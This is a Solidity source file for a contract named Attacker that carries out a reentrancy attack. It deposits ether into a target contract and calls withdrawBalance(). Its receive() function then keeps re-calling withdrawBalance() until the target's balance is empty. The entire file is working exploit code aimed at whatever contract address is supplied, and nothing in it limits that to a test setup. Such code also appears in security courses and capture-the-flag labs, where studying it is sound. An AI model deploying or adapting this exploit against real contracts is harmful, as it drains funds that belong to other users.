// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Attacker {

    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        require(msg.value > 0);

        (bool success, ) = target.call{value:msg.value} (
            abi.encodeWithSignature("depositBalance()")
        );
        require(success, "Deposit Failed");

        target.call(abi.encodeWithSignature("withdrawBalance()"));
    }

    receive() external payable {
        if(address(target).balance > 0) {
            target.call(abi.encodeWithSignature("withdrawBalance()"));
        }
    }
}